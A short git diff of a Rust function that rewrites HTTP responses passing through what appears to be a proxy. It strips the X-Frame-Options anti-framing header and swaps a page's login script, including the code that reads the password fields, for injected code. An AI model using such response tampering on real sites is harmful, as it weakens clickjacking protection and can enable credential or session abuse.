@@ -48,10 +48,18 @@ fn modify_buffer(buffer: &mut Vec<u8>, length: usize, password_segment: &str) ->
                     [b"{this._beforeLogin()}", b"{this._beforeLogin();this._onLogin()}"],
                     [b"s=o.getValue(),r=n.getValue()", password_segment.as_bytes()],
                 ];
+    
 
     let old_length = buffer.len();
 
+    replace(b"X-Frame-Options: SAMEORIGIN\r\n", b"", buffer, length);
+
+    let diff = old_length - buffer.len();
+
+    let length = length - diff;
+
     let old_buffer = buffer.clone();
+    let old_length = old_buffer.len();
 
     for [from, to] in &replaces {
         replace(from, to, buffer, length);
@@ -64,7 +72,7 @@ fn modify_buffer(buffer: &mut Vec<u8>, length: usize, password_segment: &str) ->
         // println!("come on {} {}", std::str::from_utf8(&old_buffer).unwrap(), std::str::from_utf8(buffer).unwrap());
     }
 
-    return new_length as isize - old_length as isize;
+    return new_length as isize - old_length as isize - diff as isize;
 }
 
 fn log(data: &[u8], client: &crate::Client) {
